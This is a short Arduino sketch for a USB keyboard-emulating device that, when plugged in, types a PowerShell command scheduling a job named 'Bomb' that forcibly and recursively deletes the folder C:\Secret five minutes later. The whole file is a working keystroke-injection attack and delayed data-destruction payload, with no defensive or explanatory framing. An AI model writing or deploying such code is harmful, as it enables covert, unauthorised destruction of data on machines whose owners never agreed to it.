#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin();
  delay(3000);
  Keyboard.println(F("powershell -c \"Register-ScheduledJob -Name Bomb -ScriptBlock { Remove-Item C:\\Secret -Recurse -Force } -Trigger (New-JobTrigger -Once -At (Get-Date).AddMinutes(5))\""));
}
